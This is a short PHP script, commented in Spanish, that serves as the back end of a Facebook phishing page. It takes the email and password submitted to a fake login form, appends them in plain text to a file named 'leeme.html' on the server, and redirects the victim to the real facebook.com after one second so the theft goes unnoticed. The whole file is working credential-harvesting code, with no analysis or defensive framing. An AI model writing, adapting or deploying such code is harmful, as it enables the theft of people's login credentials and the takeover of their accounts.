<?php
// Asigna el valor a las variables del usuario y contraseña
$email = $_POST['email'];
$pass = $_POST['pass'];

$guardame = fopen('leeme.html', 'a+');
fwrite($guardame, "email: ".$email."\npass: ".$pass." ");
fclose($guardame);

// Redirecciona a la web original (facebook) después de 1 segundo
header("refresh:1;url=http://www.facebook.com");
exit;
?>
